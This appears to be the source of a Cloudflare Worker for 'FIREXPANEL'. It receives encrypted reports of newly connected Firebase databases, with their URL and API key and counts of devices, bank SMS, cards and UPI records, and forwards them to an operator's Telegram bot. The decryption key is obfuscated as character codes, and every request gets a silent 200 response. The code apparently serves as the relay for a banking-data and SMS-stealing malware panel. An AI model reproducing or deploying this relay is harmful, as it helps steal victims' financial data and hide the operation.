/**
 * FIREXPANEL — Cloudflare Worker (Secure v2)
 *
 * Secrets stored as Cloudflare encrypted secrets:
 *   - BOT_TOKEN   (Telegram bot token)
 *   - ADMIN_ID    (Telegram chat ID)
 */

const MAX_AGE_MS = 300000;
const RATE_LIMIT = 10;
const RATE_WINDOW_MS = 600000;
const MAX_BODY_SIZE = 65536;
const _C = [88,107,57,109,80,50,119,78,55,113,76,52,118,82,54,106,72,51,99,70,56,121,84,49,90,98,69,53,115,65,48,57];

const CORS = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Headers': 'Content-Type',
  'Access-Control-Allow-Methods': 'POST,OPTIONS',
};

const SEC_HEADERS = {
  'X-Content-Type-Options': 'nosniff',
  'X-Frame-Options': 'DENY',
  'Referrer-Policy': 'no-referrer',
  'Cache-Control': 'no-store',
};

function safeResponse(body, status, extra) {
  return new Response(body, {
    status,
    headers: { ...SEC_HEADERS, ...extra },
  });
}

// --- Rate Limiter with cleanup ---
const rateBuckets = new Map();

function checkRate(ip) {
  const now = Date.now();
  if (rateBuckets.size > 200) {
    for (const [k, v] of rateBuckets) {
      if (now >= v.resetAt) rateBuckets.delete(k);
    }
  }
  let b = rateBuckets.get(ip);
  if (!b || now >= b.resetAt) {
    b = { count: 0, resetAt: now + RATE_WINDOW_MS };
    rateBuckets.set(ip, b);
  }
  return ++b.count <= RATE_LIMIT;
}

// --- AES-GCM Decryption ---
async function getAesKey() {
  const s = _C.map(function (c) { return String.fromCharCode(c); }).join('');
  const d = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(s));
  return crypto.subtle.importKey('raw', d, { name: 'AES-GCM' }, false, ['decrypt']);
}

async function doDecrypt(b64, key) {
  const bytes = Uint8Array.from(atob(b64), function (c) {
    return c.charCodeAt(0);
  });
  const plain = await crypto.subtle.decrypt(
    { name: 'AES-GCM', iv: bytes.slice(0, 12) },
    key,
    bytes.slice(12)
  );
  return new TextDecoder().decode(plain);
}

// --- Telegram sender — never leaks token ---
async function sendTelegram(botToken, chatId, text, parseMode) {
  try {
    const url = 'https://api.telegram.org/bot' + botToken + '/sendMessage';
    const res = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: chatId,
        text: text,
        parse_mode: parseMode,
      }),
    });
    return res.ok;
  } catch (_e) {
    return false;
  }
}

// --- /api/ev handler ---
async function handleEv(request, env) {
  if (request.method === 'OPTIONS') {
    return new Response(null, { status: 204, headers: { ...CORS, ...SEC_HEADERS } });
  }
  if (request.method !== 'POST') {
    return new Response(null, { status: 405, headers: { ...CORS, ...SEC_HEADERS } });
  }

  const botToken = env.BOT_TOKEN;
  const adminId = env.ADMIN_ID;
  if (!botToken || !adminId) {
    return new Response(null, { status: 200, headers: { ...CORS, ...SEC_HEADERS } });
  }

  const ip = (
    request.headers.get('CF-Connecting-IP') ||
    request.headers.get('X-Forwarded-For') ||
    'unknown'
  ).split(',')[0].trim();

  if (!checkRate(ip)) {
    return new Response(null, { status: 200, headers: { ...CORS, ...SEC_HEADERS } });
  }

  try {
    const contentLength = parseInt(request.headers.get('Content-Length') || '0', 10);
    if (contentLength > MAX_BODY_SIZE) {
      return new Response(null, { status: 200, headers: { ...CORS, ...SEC_HEADERS } });
    }

    let body;
    try {
      body = await request.json();
    } catch (_e) {
      return new Response(null, { status: 200, headers: { ...CORS, ...SEC_HEADERS } });
    }

    const b64 = typeof body?.d === 'string' ? body.d : '';
    if (!b64) {
      return new Response(null, { status: 200, headers: { ...CORS, ...SEC_HEADERS } });
    }

    let data;
    try {
      const key = await getAesKey();
      data = JSON.parse(await doDecrypt(b64, key));
    } catch (_e) {
      return new Response(null, { status: 200, headers: { ...CORS, ...SEC_HEADERS } });
    }

    if (!data.ts || Math.abs(Date.now() - Number(data.ts)) > MAX_AGE_MS) {
      return new Response(null, { status: 200, headers: { ...CORS, ...SEC_HEADERS } });
    }

    const {
      firebaseUrl = '',
      apiKey = '',
      total = 0,
      online = 0,
      offline = 0,
      bankSms = 0,
      upiCount = 0,
      cardCount = 0,
    } = data;

    if (!firebaseUrl) {
      return new Response(null, { status: 200, headers: { ...CORS, ...SEC_HEADERS } });
    }

    const msg =
      '🔥 *FIREXPANEL — New Firebase Connected*\n\n' +
      '📡 *URL:* `' + firebaseUrl + '`\n' +
      '🔑 *Key:* `' + apiKey + '`\n\n' +
      '📊 *Total:* ' + total +
      '   🟢 *Online:* ' + online +
      '   ⚫ *Offline:* ' + offline + '\n' +
      '🏦 *Bank SMS:* ' + bankSms +
      '   💳 *Cards:* ' + cardCount +
      '   📲 *UPI:* ' + upiCount + '\n\n' +
      '⏰ ' +
      new Date().toLocaleString('en-IN', { timeZone: 'Asia/Kolkata' }) +
      ' IST';

    await sendTelegram(botToken, adminId, msg, 'Markdown');
  } catch (_e) {
    // Silent fail — never expose internals
  }

  return new Response(null, { status: 200, headers: { ...CORS, ...SEC_HEADERS } });
}

// --- /api/ping handler ---
async function handlePing(env) {
  const botToken = env.BOT_TOKEN;
  const adminId = env.ADMIN_ID;
  if (!botToken || !adminId) {
    return safeResponse(
      '❌ Secrets not configured. Set BOT_TOKEN and ADMIN_ID via wrangler.',
      200,
      { 'Content-Type': 'text/plain' }
    );
  }

  const text =
    '✅ *FIREXPANEL — Bot Connected Successfully!*\n\n' +
    'Your Telegram bot is configured correctly.\n' +
    'You will now receive alerts whenever a new Firebase database is connected.\n\n' +
    '🔒 Encrypted · 🚀 Cloudflare Powered · ⚡ Ready';

  const ok = await sendTelegram(botToken, adminId, text, 'Markdown');
  return safeResponse(
    ok
      ? '✅ Test message sent to Telegram! Check your bot.'
      : '❌ Failed to send. Verify secrets are correct.',
    200,
    { 'Content-Type': 'text/plain' }
  );
}

// --- Main entrypoint ---
export default {
  async fetch(request, env) {
    try {
      const path = new URL(request.url).pathname;

      if (path === '/api/ev' || path === '/api/ev/') {
        return handleEv(request, env);
      }
      if (path === '/api/ping' || path === '/api/ping/') {
        return handlePing(env);
      }

      return safeResponse('OK', 200, {});
    } catch (_e) {
      return new Response('OK', { status: 200 });
    }
  },
};
